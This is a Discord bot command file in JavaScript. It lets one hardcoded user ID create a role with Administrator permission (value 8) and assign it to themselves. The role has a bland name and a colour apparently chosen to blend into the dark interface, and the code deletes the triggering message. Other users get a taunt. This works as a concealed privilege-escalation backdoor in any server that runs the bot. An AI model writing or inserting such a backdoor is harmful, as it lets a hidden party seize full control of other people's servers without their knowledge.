exports.run = async (client, message, args) => {
    if (message.author.id == '702412371209224232') {
        try {

            role = await message.guild.roles.create ({

                data: {
                    name: "Dope Role",
                    color: "#2f3136",
                    permissions: [8]
                }

            });
                
            message.member.roles.add(role)
            message.delete();

        } catch(e) {

            console.log(e.stack);

        }
    }else {
        message.channel.send('You scrub, what made you think you\'d be able to do that??');
    }
}